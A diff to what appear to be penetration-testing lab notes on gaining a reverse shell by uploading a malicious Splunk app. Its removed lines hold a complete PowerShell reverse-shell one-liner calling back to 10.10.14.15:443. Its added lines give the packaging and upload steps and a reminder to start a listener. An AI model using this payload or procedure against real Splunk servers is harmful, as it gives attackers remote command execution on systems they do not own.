@@ -391,8 +391,11 @@ println("${cmd.text}");
 * can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us
 	* The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file
 	* reverse shell will be a PowerShell one-liner:
-```powershell
-#A simple and small reverse shell. Options and help removed to save space. 
-#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
-$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+	* `inputs.conf` file tells Splunk which script to run and any other conditions
+	* We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner
+* Once the files are created, we can create a tarball or `.spl` file
+```bash
+tar -cvzf updater.tar.gz splunk_shell/
 ```
+* next step is to choose `Install app from file` and upload the application
+* start listener before upload
